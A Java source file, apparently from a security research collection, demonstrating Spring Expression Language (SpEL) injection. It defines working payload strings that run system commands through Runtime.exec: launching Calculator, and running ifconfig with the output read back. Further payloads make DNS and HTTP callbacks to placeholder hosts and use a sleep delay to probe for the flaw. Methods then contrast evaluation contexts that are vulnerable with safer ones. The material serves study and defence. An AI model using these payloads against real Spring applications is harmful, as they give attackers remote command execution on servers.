package com.example.spelattack;

import org.springframework.context.expression.MethodBasedEvaluationContext;
import org.springframework.expression.EvaluationContext;
import org.springframework.expression.Expression;
import org.springframework.expression.spel.standard.SpelExpressionParser;
import org.springframework.expression.spel.support.SimpleEvaluationContext;
import org.springframework.expression.spel.support.StandardEvaluationContext;

/**
 * @author Whoopsunix
 */
public class SPEL {
    public static void main(String[] args) {
        /**
         * 命令执行
         */
        // 无回显
        String runtime = "T(java.lang.Runtime).getRuntime().exec('open -a Calculator.app')";
        // 回显
        String runtimeEcho = "new java.util.Scanner(T(java.lang.Runtime).getRuntime().exec('ifconfig').getInputStream()).useDelimiter(\"\\\\A\").next()";

        /**
         * 探测
         */
        String DNSLOG = "T(java.net.InetAddress).getByName('DNSLOG')";
        String HTTPLOG = "new java.net.URL('http://host').getContent()";
        String HTTPLOG2 = "new org.springframework.web.client.RestTemplate().headForHeaders('http://host')";
        // 延时
        String sleep = "T(java.lang.Thread).sleep(10000)";

        /**
         * todo 类加载
         */



        Object obj = spel(runtime);
        System.out.println(obj);
    }

    public static Object spel(String payload) {
        return new SpelExpressionParser().parseExpression(payload).getValue();
    }

    /**
     * 默认也是用的 StandardEvaluationContext
     */
    public static Object spelStandardEvaluationContext(String payload) {
        EvaluationContext evaluationContext = new StandardEvaluationContext();
        return new SpelExpressionParser().parseExpression(payload).getValue(evaluationContext);
    }

    public static Object spelMethodBasedEvaluationContext(String payload) {

        EvaluationContext evaluationContext = new MethodBasedEvaluationContext(new User(), null, null, null);
        return new SpelExpressionParser().parseExpression(payload).getValue(evaluationContext);
    }

    /**
     * safe
     */

    /**
     * SimpleEvaluationContext
     */
    public static Object spelSimpleEvaluationContext(String payload) {
        EvaluationContext evaluationContext = SimpleEvaluationContext.forReadOnlyDataBinding().build();
        return new SpelExpressionParser().parseExpression(payload).getValue(evaluationContext);
    }

    public static Object spelSafe(String payload) {
        StandardEvaluationContext context = new StandardEvaluationContext();
        context.setVariable("payload", payload);
        Expression expression = new SpelExpressionParser().parseExpression("#payload");
        return expression.getValue(context);
    }
}
